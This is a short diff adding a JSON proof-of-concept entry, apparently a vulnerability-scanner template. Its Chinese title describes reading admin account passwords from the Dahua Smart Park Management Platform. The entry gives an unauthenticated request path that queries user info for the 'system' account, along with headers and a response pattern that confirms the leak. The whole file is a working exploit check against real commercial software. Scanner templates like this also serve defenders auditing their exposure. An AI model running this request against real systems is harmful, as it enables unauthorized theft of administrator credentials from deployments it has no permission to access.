@@ -1,0 +1,14 @@
+{
+	"name":"大华智慧园区管理平台后台帐号密码读取",
+	"tag":"dahua",
+	"type":"file_read",
+	"poc":{
+		"pocGet":"/admin/user_getUserInfoByUserName.action?userName=system",
+		"header":{
+			"User-Agent":"Mozilla/5.0 (Linux;",
+			"content-type":"text/plain"
+		},
+		"status_code":"200",
+		"pattern":"(loginName)"
+	}
+}
